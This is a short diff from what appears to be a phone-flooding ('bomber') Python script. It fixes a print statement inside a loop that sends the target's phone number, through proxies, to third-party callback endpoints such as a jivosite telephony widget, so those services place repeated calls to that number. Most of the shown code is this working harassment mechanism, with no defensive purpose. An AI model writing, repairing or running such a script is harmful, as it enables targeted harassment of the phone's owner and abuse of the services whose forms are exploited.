@@ -174,7 +174,7 @@ for _ in track(range(run)):
          print('Не отправлено (sex-shop.ua)')
  try:
          requests.post("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback", data={"phone": number, "invitation_text": ""}, headers=headers, proxies=proxies)
-         print(jivosite.com'')
+         print('jivosite.com')
  except:
          print('Не отправлено (jivosite.com)')
  try:
